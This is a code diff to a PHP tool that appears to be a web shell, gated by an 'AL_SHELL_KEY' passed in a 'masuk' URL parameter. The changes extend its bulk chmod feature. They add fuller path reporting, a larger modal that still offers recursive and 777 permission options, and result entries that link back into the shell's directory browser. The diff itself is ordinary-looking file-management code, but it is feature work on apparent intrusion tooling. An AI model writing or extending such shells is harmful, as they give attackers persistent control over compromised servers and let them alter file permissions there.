@@ -604,15 +604,19 @@ if (isset($_POST['action']) && $_POST['action'] === 'chmod_bulk' && !empty($_POS
     
     // Function to recursively chmod
     function chmod_recursive($path, $permission, &$results) {
+        global $dir;
         if (!file_exists($path)) {
-            $results['errors'][] = 'Not found: ' . basename($path);
+            $results['errors'][] = 'Not found: ' . $path;
             $results['failed_count']++;
             return false;
         }
         
         $success = @chmod($path, octdec($permission));
+        $parentDir = dirname($path);
         $results['processed'][] = [
             'path' => $path,
+            'name' => basename($path),
+            'dir' => $parentDir,
             'type' => is_dir($path) ? 'dir' : 'file',
             'success' => $success
         ];
@@ -620,7 +624,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'chmod_bulk' && !empty($_POS
         if ($success) {
             $results['success_count']++;
         } else {
-            $results['errors'][] = 'Failed: ' . basename($path);
+            $results['errors'][] = 'Failed: ' . $path;
             $results['failed_count']++;
         }
         $results['total']++;
@@ -651,20 +655,23 @@ if (isset($_POST['action']) && $_POST['action'] === 'chmod_bulk' && !empty($_POS
             // Single item chmod
             if (file_exists($targetPath)) {
                 $success = @chmod($targetPath, octdec($permission));
+                $parentDir = dirname($targetPath);
                 $results['processed'][] = [
                     'path' => $targetPath,
+                    'name' => basename($targetPath),
+                    'dir' => $parentDir,
                     'type' => is_dir($targetPath) ? 'dir' : 'file',
                     'success' => $success
                 ];
                 if ($success) {
                     $results['success_count']++;
                 } else {
-                    $results['errors'][] = 'Failed: ' . basename($targetPath);
+                    $results['errors'][] = 'Failed: ' . $targetPath;
                     $results['failed_count']++;
                 }
                 $results['total']++;
             } else {
-                $results['errors'][] = 'Not found: ' . basename($targetPath);
+                $results['errors'][] = 'Not found: ' . $targetPath;
                 $results['failed_count']++;
                 $results['total']++;
             }
@@ -2192,50 +2199,53 @@ function list_dir($path) {
 </div>
 <!-- Chmod Bulk Modal -->
 <div class="modal" id="chmodBulkModal">
-    <div class="modal-content" style="max-width: 500px;">
-        <div class="modal-header">
+    <div class="modal-content" style="max-width: 800px; width: 90vw; max-height: 90vh; display: flex; flex-direction: column;">
+        <div class="modal-header" style="flex-shrink: 0;">
             <h3>🔧 Chmod Bulk</h3>
+            <button onclick="closeModal('chmodBulkModal')" style="padding: 4px 12px;">✕</button>
         </div>
-        <div style="padding: 15px;">
-            <p style="margin: 0 0 10px 0; font-size: 12px; color: #888;">
-                Selected items: <span id="chmodBulkCount" style="color: #0f0; font-weight: bold;">0</span>
-            </p>
-            
-            <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">Permission:</label>
-            <select id="chmodBulkPerm" style="width: 100%; margin-bottom: 15px; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0;">
-                <option value="755">755 (rwxr-xr-x) - Executable</option>
-                <option value="644" selected>644 (rw-r--r--) - Standard File</option>
-                <option value="777">777 (rwxrwxrwx) - Full Access</option>
-                <option value="600">600 (rw-------) - Private</option>
-                <option value="750">750 (rwxr-x---) - Restricted</option>
-                <option value="custom">Custom...</option>
-            </select>
-            
-            <div id="chmodBulkCustomDiv" style="display: none; margin-bottom: 15px;">
-                <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">Custom (e.g., 755, u+rwx):</label>
-                <input type="text" id="chmodBulkCustomInput" placeholder="755" style="width: 100%; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0;">
+        <div style="padding: 15px; overflow-y: auto; flex: 1;">
+            <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
+                <div style="flex: 1; min-width: 200px;">
+                    <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">
+                        Selected: <span id="chmodBulkCount" style="color: #0f0; font-weight: bold;">0</span> items
+                    </label>
+                    <select id="chmodBulkPerm" style="width: 100%; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 4px;">
+                        <option value="755">755 (rwxr-xr-x) - Executable</option>
+                        <option value="644" selected>644 (rw-r--r--) - Standard File</option>
+                        <option value="777">777 (rwxrwxrwx) - Full Access</option>
+                        <option value="600">600 (rw-------) - Private</option>
+                        <option value="750">750 (rwxr-x---) - Restricted</option>
+                        <option value="custom">Custom...</option>
+                    </select>
+                </div>
+                <div id="chmodBulkCustomDiv" style="flex: 1; min-width: 200px; display: none;">
+                    <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">Custom:</label>
+                    <input type="text" id="chmodBulkCustomInput" placeholder="e.g., 755, u+rwx" style="width: 100%; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 4px;">
+                </div>
+                <div style="flex: 1; min-width: 200px; display: flex; align-items: flex-end;">
+                    <label style="font-size: 12px; color: #888; display: flex; align-items: center; cursor: pointer; padding: 8px; background: #1a1a1a; border-radius: 4px; border: 1px solid #333;">
+                        <input type="checkbox" id="chmodBulkRecursive" style="margin-right: 8px;">
+                        <span>🔁 Recursive (subfolders)</span>
+                    </label>
+                </div>
             </div>
             
-            <label style="font-size: 12px; color: #888; display: flex; align-items: center; cursor: pointer;">
-                <input type="checkbox" id="chmodBulkRecursive" style="margin-right: 8px;">
-                <span>🔁 Recursive (apply to all files/subfolders inside selected folders)</span>
-            </label>
-            
-            <div id="chmodBulkProgress" style="display: none; margin-top: 15px; padding: 10px; background: #111; border: 1px solid #333; border-radius: 4px;">
+            <div id="chmodBulkProgress" style="display: none; margin-bottom: 15px; padding: 10px; background: #111; border: 1px solid #333; border-radius: 4px;">
                 <div style="font-size: 11px; color: #888; margin-bottom: 5px;">
-                    Progress: <span id="chmodBulkCurrent" style="color: #0f0;">0</span> / <span id="chmodBulkTotal">0</span>
+                    Progress: <span id="chmodBulkCurrent" style="color: #0f0; font-weight: bold;">0</span> / <span id="chmodBulkTotal">0</span>
                 </div>
-                <div style="height: 4px; background: #333; border-radius: 2px; overflow: hidden;">
+                <div style="height: 6px; background: #333; border-radius: 3px; overflow: hidden;">
                     <div id="chmodBulkProgressBar" style="height: 100%; background: linear-gradient(90deg, #0f0, #6cf); width: 0%; transition: width 0.3s;"></div>
                 </div>
-                <div id="chmodBulkStatus" style="font-size: 10px; color: #6cf; margin-top: 5px;">Initializing...</div>
+                <div id="chmodBulkStatus" style="font-size: 11px; color: #6cf; margin-top: 5px;">Initializing...</div>
             </div>
             
-            <div id="chmodBulkResults" style="display: none; margin-top: 15px; max-height: 150px; overflow-y: auto; font-size: 11px; font-family: monospace; background: #000; padding: 10px; border: 1px solid #333; border-radius: 4px;"></div>
+            <div id="chmodBulkResults" style="display: none; max-height: 50vh; overflow-y: auto; font-size: 12px; font-family: monospace; background: #000; padding: 10px; border: 1px solid #333; border-radius: 4px;"></div>
         </div>
-        <div class="modal-footer">
-            <button id="chmodBulkExecuteBtn" onclick="executeChmodBulk()" style="background: #ff9800; color: #111; font-weight: bold;">🚀 Execute</button>
-            <button type="button" onclick="closeModal('chmodBulkModal')" id="chmodBulkCloseBtn">Cancel</button>
+        <div class="modal-footer" style="flex-shrink: 0; border-top: 1px solid #333; padding: 10px 15px;">
+            <button id="chmodBulkExecuteBtn" onclick="executeChmodBulk()" style="background: #ff9800; color: #111; font-weight: bold; padding: 8px 20px;">🚀 Execute</button>
+            <button type="button" onclick="closeModal('chmodBulkModal')" id="chmodBulkCloseBtn" style="padding: 8px 20px;">Cancel</button>
         </div>
     </div>
 </div>
@@ -2907,53 +2917,65 @@ async function executeChmodBulk() {
             currentSpan.textContent = data.total;
             progressBar.style.width = '100%';
             
+            // Sort: success first, then failed
+            const sortedItems = data.processed.sort((a, b) => {
+                if (a.success === b.success) return 0;
+                return a.success ? -1 : 1; // Success first
+            });
+            
             // Build results
             let html = '';
-            html += '<div style="margin-bottom:10px;padding:5px;background:#1a1a1a;border-radius:4px;">';
-            html += '<span style="color:#0f0">✅ Success: ' + data.success_count + '</span> | ';
-            html += '<span style="color:#f44">❌ Failed: ' + data.failed_count + '</span> | ';
+            html += '<div style="margin-bottom:10px;padding:8px;background:#1a1a1a;border-radius:4px;display:flex;gap:15px;">';
+            html += '<span style="color:#0f0">✅ Success: ' + data.success_count + '</span>';
+            html += '<span style="color:#f44">❌ Failed: ' + data.failed_count + '</span>';
             html += '<span style="color:#888">Total: ' + data.total + '</span>';
             html += '</div>';
             
-            // Show processed items (limited to first 50)
-            const displayItems = data.processed.slice(0, 50);
+            // Show processed items with clickable paths (limited to first 100)
+            const displayItems = sortedItems.slice(0, 100);
             displayItems.forEach(item => {
                 const icon = item.type === 'dir' ? '📁' : '📄';
                 const color = item.success ? '#0f0' : '#f44';
                 const status = item.success ? '✓' : '✗';
-                html += '<div style="margin:2px 0;font-size:10px;">';
-                html += '<span style="color:' + color + '">' + status + '</span> ';
-                html += icon + ' ' + escapeHtml(item.path.split('/').pop());
+                const encodedDir = encodeURIComponent(item.dir);
+                
+                html += '<div style="margin:3px 0;font-size:11px;display:flex;align-items:center;gap:8px;">';
+                html += '<span style="color:' + color + ';font-weight:bold;min-width:15px;">' + status + '</span>';
+                html += '<span style="color:#888">' + icon + '</span>';
+                html += '<a href="?masuk=<?php echo AL_SHELL_KEY ?>&d=' + encodedDir + '" ';
+                html += 'target="_blank" style="color:#6cf;text-decoration:none;word-break:break-all;" ';
+                html += 'title="Open: ' + escapeHtml(item.dir) + '">';
+                html += escapeHtml(item.path);
+                html += '</a>';
                 html += '</div>';
             });
             
-            if (data.processed.length > 50) {
-                html += '<div style="color:#888;font-size:10px;margin-top:5px;">... and ' + (data.processed.length - 50) + ' more items</div>';
+            if (sortedItems.length > 100) {
+                html += '<div style="color:#888;font-size:10px;margin-top:10px;padding:5px;background:#111;border-radius:4px;">';
+                html += '... and ' + (sortedItems.length - 100) + ' more items (showing first 100)</div>';
             }
             
-            // Show errors if any
-            if (data.errors.length > 0) {
-                html += '<div style="margin-top:10px;padding:5px;background:#2a0000;border-radius:4px;">';
-                html += '<div style="color:#f44;font-weight:bold;margin-bottom:5px;">Errors:</div>';
-                data.errors.slice(0, 10).forEach(err => {
-                    html += '<div style="color:#f88;font-size:10px;">• ' + escapeHtml(err) + '</div>';
+            // Show errors if any (only failed items summary)
+            if (data.failed_count > 0) {
+                html += '<div style="margin-top:15px;padding:8px;background:#2a0000;border-radius:4px;border:1px solid #f44;">';
+                html += '<div style="color:#f44;font-weight:bold;margin-bottom:8px;">❌ Failed Items Summary:</div>';
+                const failedItems = sortedItems.filter(item => !item.success).slice(0, 20);
+                failedItems.forEach(item => {
+                    html += '<div style="color:#f88;font-size:10px;margin:2px 0;word-break:break-all;">• ' + escapeHtml(item.path) + '</div>';
                 });
-                if (data.errors.length > 10) {
-                    html += '<div style="color:#888;font-size:10px;">... and ' + (data.errors.length - 10) + ' more errors</div>';
+                if (data.failed_count > 20) {
+                    html += '<div style="color:#888;font-size:10px;margin-top:5px;">... and ' + (data.failed_count - 20) + ' more failed</div>';
                 }
                 html += '</div>';
             }
             
             resultsDiv.innerHTML = html;
-            statusDiv.innerHTML = '<span style="color:#0f0">✅ Completed!</span>';
+            statusDiv.innerHTML = '<span style="color:#0f0;font-weight:bold;">✅ Completed!</span>';
             
             executeBtn.textContent = '✅ Done';
             closeBtn.textContent = 'Close';
             
-            // Refresh page after 2 seconds if successful
-            if (data.failed_count === 0) {
-                setTimeout(() => window.location.reload(), 2000);
-            }
+            // Don't auto refresh - let user review results and click paths
         } else {
             throw new Error('Server returned error');
         }
